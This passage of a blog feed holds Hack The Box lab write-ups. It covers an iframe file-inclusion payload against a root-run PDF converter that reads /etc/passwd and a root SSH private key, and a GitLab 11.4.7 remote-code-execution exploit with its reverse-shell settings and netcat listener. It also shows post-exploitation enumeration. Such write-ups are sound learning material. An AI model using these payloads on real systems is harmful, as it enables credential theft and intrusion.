&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210423194028.png&quot; alt=&quot;Pasted image 20210423194028&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210423194154.png&quot; alt=&quot;Pasted image 20210423194154&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also note that these file are owned by &lt;strong&gt;root&lt;/strong&gt;, which make this PDF conversion a good target for further escalation.&lt;/p&gt;

&lt;h3 id=&quot;exploiting-pdf-conversion&quot;&gt;Exploiting PDF Conversion&lt;/h3&gt;

&lt;h4 id=&quot;adapting-code-for-easier-exploitation&quot;&gt;Adapting code for easier exploitation&lt;/h4&gt;

&lt;p&gt;Before starting, we change our attack vector a little to allow easier injection process, mainly by bundling up a few command together and externalising the data to be inserted into its own json file, which can be included in the command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# create the table&lt;/span&gt;
aws dynamodb create-table &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;nt&quot;&gt;--attribute-definitions&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nt&quot;&gt;--key-schema&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HASH &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RANGE &lt;span class=&quot;nt&quot;&gt;--provisioned-throughput&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10,WriteCapacityUnits&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566

&lt;span class=&quot;c&quot;&gt;# add load the json payload&lt;/span&gt;
aws dynamodb put-item &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;nt&quot;&gt;--item&lt;/span&gt; file://exploit.json &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://127.0.0.1:4566 

&lt;span class=&quot;c&quot;&gt;# create the pdf&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'action=get_alerts'&lt;/span&gt; 127.0.0.1:8000

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;getting-lfi&quot;&gt;Getting LFI&lt;/h4&gt;

&lt;p&gt;We attempt first a basic LFI by attempting to include the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file in the pdf with the following payload:&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ransomware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;iframe src=file:///etc/passwd&amp;gt;&amp;lt;/iframe&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And by running the steps above, we have a POC we are able to use LFI as root:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425005137.png&quot; alt=&quot;Pasted image 20210425005137&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;privilege-escalation-to-root&quot;&gt;Privilege Escalation to root&lt;/h4&gt;

&lt;p&gt;Using the LFI we found above, we first try to see if any &lt;strong&gt;ssh private keys&lt;/strong&gt; would be present in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/.ssh/id_rsa&lt;/code&gt; and adapt our payload to the following:&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ransomware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;iframe src=file:///root/.ssh/id_rsa&amp;gt;&amp;lt;/iframe&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And running the attack again, we get a private key dumped:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425010221.png&quot; alt=&quot;Pasted image 20210425010221&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We copy the content of this file into a local file, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 600&lt;/code&gt; it and attempt to &lt;strong&gt;ssh&lt;/strong&gt; in as root using this key.&lt;/p&gt;

&lt;p&gt;:warning: &lt;em&gt;The process of formatting the key to a valid format was somewhat tedious; manual copy-paste didn’t keep line breaks. After some &lt;strong&gt;sed&lt;/strong&gt; and trial-and-error, we finally managed to get it formatted, although there must be a more automatic way to format it properly.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We are able to successfully login as root and get the :black_flag: &lt;strong&gt;root.txt&lt;/strong&gt; :black_flag: flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20210425012911.png&quot; alt=&quot;Pasted image 20210425012911&quot; /&gt;&lt;/p&gt;</content><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><category term="htb" /><summary type="html"></summary></entry><entry><title type="html">HTB Writeup - Ready</title><link href="/posts/HTB-Writeup-Ready" rel="alternate" type="text/html" title="HTB Writeup - Ready" /><published>2021-03-31T01:18:00+02:00</published><updated>2021-03-31T01:18:00+02:00</updated><id>/posts/HTB-Writeup:-Ready</id><content type="html" xml:base="/posts/HTB-Writeup-Ready">&lt;p&gt;&lt;img src=&quot;/assets/images/d7a56d2476ef541853df356a46976f45.png&quot; alt=&quot;ready_logo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A fun and well made box, where 80% of the time was spent enumerating and the remaining 20% split on easy foothold and root privesc.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; I am in no way an expert in the matter, been learning netsec and pentesting on the side by doing these boxes on HTB and watching an obscene amount of IppSec videos. What I am writing is simply my though process and might not be the most optimal solution, I find this method of writing good for self-education purposes. In fact, I try to write in the order I did everything, so you might see me bouncing back and forth between services.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;p&gt;We start with the standard &lt;strong&gt;nmap&lt;/strong&gt; scan on 10.10.10.220:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/ready 10.10.10.220
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;stbl: 
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-03-22 22:51 CET
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.220
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.033s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/edit /users /help 
|_/s/ /snippets/new /snippets/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/edit
| http-title: Sign &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;C2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;B7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;13.51 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So here we are presented with a fairly up-to-date OpenSSH and &lt;em&gt;nginx&lt;/em&gt; instance running on port 5080, which nmap already identified as being a &lt;strong&gt;GitLab&lt;/strong&gt; machine. &lt;em&gt;This is convenient as I recently did Laboratory, which also revolved around GL.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We have a quick check at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file present, but it turns out to be the standard GitLab-supplied robots file.&lt;/p&gt;

&lt;p&gt;We start a &lt;strong&gt;gobuster&lt;/strong&gt; recon on the server while we start manually going through the GitLab instance.&lt;/p&gt;

&lt;h3 id=&quot;http-5080---gitlabs-recon&quot;&gt;HTTP (5080 - GitLabs) Recon&lt;/h3&gt;

&lt;p&gt;First thing we do on the GitLab login page is to attempt creating a user. This is successful and we land on the user dashboard. We know from &lt;em&gt;Laboratory&lt;/em&gt;  that GitLab is supposed to disclose its version on the &lt;em&gt;Help&lt;/em&gt; page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-22_23-11-21.png&quot; alt=&quot;Screenshot_2021-03-22_23-11-21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we are dealing with version &lt;strong&gt;&lt;em&gt;11.4.7&lt;/em&gt;&lt;/strong&gt;, for which a quick &lt;strong&gt;searchsploit&lt;/strong&gt; search reveals to be quite vulnerable to RCE:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2018-19571 + CVE-2018-19585&lt;/li&gt;
  &lt;li&gt;https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We decide to go with the latter. and start exploiting the GitLab service.&lt;/p&gt;

&lt;h2 id=&quot;exploitation---gitlab&quot;&gt;Exploitation - GitLab&lt;/h2&gt;

&lt;p&gt;The python exploit we picked is fairly straightforward and requires a few parameters to be filled:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Sign in GitLab 11.4.7  portal and get (using Burp or something other):
# authenticity_token
# authenticated cookies
# username
# specify localport and localip for reverse shell
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'aaaaaaaaaaaa'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;authenticity_token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'jpT/n1EoPwwWtiGu/+QKVQomofMNyqAQXY+iD2kVoRQoiQNzcFHPAj2+M4pyblKo/7UkClKW8jvp51Aw2qzs7g=='&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'_gitlab_session=c942527505cc0580c026610a1799b811; sidebar_collapsed=false'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;localport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'1234'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;localip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'192.168.0.114'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Where the:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;username&lt;/em&gt; is whom we signed-up with&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;authenticity_token&lt;/em&gt; is extracted from &lt;strong&gt;burp&lt;/strong&gt; (or just in the source really) as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-token&lt;/code&gt; : &lt;img src=&quot;/assets/images/Screenshot_2021-03-30_23-02-24.png&quot; alt=&quot;Screenshot_2021-03-30_23-02-24&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;em&gt;cookie&lt;/em&gt; is taken from the headers in burp again.&lt;/li&gt;
  &lt;li&gt;And finally, our local IP and port listening.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;getting-a-shell-back&quot;&gt;Getting a Shell Back&lt;/h3&gt;

&lt;p&gt;We setup a listener with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lvnp&lt;/code&gt; and run the python3 exploit.&lt;/p&gt;

&lt;p&gt;As expected, we gain a shell back (actually two; the exploit script itself will also spawn a shell):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-22_23-31-11.png&quot; alt=&quot;Screenshot_2021-03-22_23-31-11&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;h3 id=&quot;git-to-root-docker&quot;&gt;git to root (docker)&lt;/h3&gt;

&lt;p&gt;As usual, we start by elevating our basic shell to a full tty:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty;pty.spawn('/bin/bash')&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ctrl+z&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;fg
ls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We find that we are system user &lt;strong&gt;git&lt;/strong&gt; and landed in the directory &lt;strong&gt;/var/opt/gitlab/gitlab-rails/working&lt;/strong&gt;, which is expected  for GitLab instances.&lt;/p&gt;

&lt;p&gt;Although no needed, we grab some information from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret.yaml&lt;/code&gt; in the &lt;em&gt;~/gitlab-rails/etc/&lt;/em&gt; folder, but did not ended up having to use any of it. In the same folder, we also notice a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database.yml&lt;/code&gt; file, which appears to be containing &lt;strong&gt;postgresql&lt;/strong&gt; information, but we can only get host information and port from it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  username: &lt;span class=&quot;s2&quot;&gt;&quot;gitlab&quot;&lt;/span&gt;
  password: 
  host: &lt;span class=&quot;s2&quot;&gt;&quot;/var/opt/gitlab/postgresql&quot;&lt;/span&gt;
  port: 5432

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;nothing really crucial here. enumerating further, we find an interesting file at the root of the filesystem; a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root_pass&lt;/code&gt;. We are able to read it so we grab its content:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:~/gitlab-rails/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root_pass 
YG65407Bjqvv9A0a8Tm_7w
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We immediately try this password on the box itself with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su -&lt;/code&gt;, but are unable to authenticate.  The other files on the file system suggest we are in a docker container. We verify for additional users on the machine with shell access and found an uncommon &lt;strong&gt;dude&lt;/strong&gt; user:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-22_23-55-38.png&quot; alt=&quot;Screenshot_2021-03-22_23-55-38&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We go see in their directory and see we are able to grab the &lt;strong&gt;user.txt&lt;/strong&gt; flag. After this we decide to start running &lt;strong&gt;linpeas&lt;/strong&gt; on the machine and also go play around in the gitlab  rails console.&lt;/p&gt;

&lt;h4 id=&quot;enumerating-with-the-gitlab-ruby-shell&quot;&gt;Enumerating with the Gitlab Ruby Shell&lt;/h4&gt;

&lt;p&gt;We start the console with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitlab-rails console&lt;/code&gt; and start by enumerating some of the users:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;------------------------------------------------------------------------------------&lt;/span&gt;
 &lt;span class=&quot;no&quot;&gt;GitLab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;mf&quot;&gt;11.4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f8423&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;no&quot;&gt;GitLab&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;8.3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
 &lt;span class=&quot;ss&quot;&gt;postgresql:   &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;9.6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;-------------------------------------------------------------------------------------&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HISTORY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_a&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Loading&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;production&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;environment&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Rails&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;4.2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HISTORY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_a&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HISTORY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_a&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;002&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#&amp;lt;User id:1 @root&amp;gt;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;003&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;count&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
